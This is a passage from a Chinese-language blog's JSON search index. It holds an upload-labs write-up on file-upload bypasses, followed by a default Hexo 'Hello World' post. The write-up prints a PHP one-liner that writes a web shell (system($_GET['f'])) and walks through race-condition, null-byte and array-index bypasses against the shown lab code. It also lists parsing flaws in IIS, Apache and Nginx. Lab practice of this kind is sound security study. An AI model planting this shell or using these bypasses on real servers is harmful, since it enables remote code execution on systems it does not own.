1234&lt;?php$c=fopen('./cmd.php','w');fwrite($c,'&lt;?php system($_GET[\"f\"]);?&gt;');?&gt; 跑了之后， 就会在该文件夹下面产生新的文件了 访问 Pass18 条件竞争图片马1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192//index.php$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; require_once(\"./myupload.php\"); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = '文件已经被上传，但没有重命名。'; break; case -1: $msg = '这个文件不能上传到服务器的临时文件存储目录。'; break; case -2: $msg = '上传失败，上传目录不可写。'; break; case -3: $msg = '上传失败，无法上传该类型文件。'; break; case -4: $msg = '上传失败，上传的文件过大。'; break; case -5: $msg = '上传失败，服务器已经存在相同名称文件。'; break; case -6: $msg = '文件无法上传，文件不能复制到目标目录。'; break; default: $msg = '未知错误！'; break; &#125;&#125;//myupload.phpclass MyUpload&#123; var $cls_arr_ext_accepted = array( \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\", \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" ); /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( \"SUCCESS\" ); &#125;&#125;; 对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功 Pass-19 00截断POST方式与12题同样的方式 Pass-20 数组加/.绕过123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES['upload_file']))&#123; //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type))&#123; $msg = \"禁止上传该类型文件!\"; &#125;else&#123; //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) &#123; $file = explode('.', strtolower($file)); &#125; $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) &#123; $msg = \"禁止上传该后缀文件!\"; &#125;else&#123; $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = \"文件上传成功！\"; $is_upload = true; &#125; else &#123; $msg = \"文件上传失败！\"; &#125; &#125; &#125;&#125;else&#123; $msg = \"请选择要上传的文件！\";&#125; 首先end函数取所post参数数组中的最后一个值，$file_name = reset($file) . ‘.’ . $file[count($file) - 1]我们可以post一个参数名为一个[0]一个[2]，然后$file[count($file) - 1]就为空，$file_name最终就为reset($file)即$file[0]，就可以绕过判断 抓包： 文件类型修改为图片类型： 漏洞利用： 上传成功： 看了其他大佬的总结，还有其他的一些未见过的解析漏洞IIS 6.0IIS 6.0解析利用又三种： 1.目录解析建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析 2.文件解析后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名) 3.默认解析IIS6.0 默认的可执行文件除了asp还包含这三种 1234/xxx.asa/xxx.cer/xxx.cdx/xxx.apsx IIS 7.0/7.5在正常图片URL后添加 /.php，可以解析为php Apache一般都在2.3.x以下版本，但是有时候配置文件的不同也会导致不安全 后缀解析：test.php.x1.x2.x3Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析test.php.x1.x2.x3则会被解析为php NginxNginx &lt;8.03畸形解析漏洞直接在正常图片URL后添加/.phpNginx &lt;=0.8.37在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞 在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2019-07-30T08:55:35.197Z","updated":"2019-07-30T08:55:35.197Z","comments":true,"path":"2019/07/30/hello-world/","link":"","permalink":"https://ddstick.github.io/2019/07/30/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}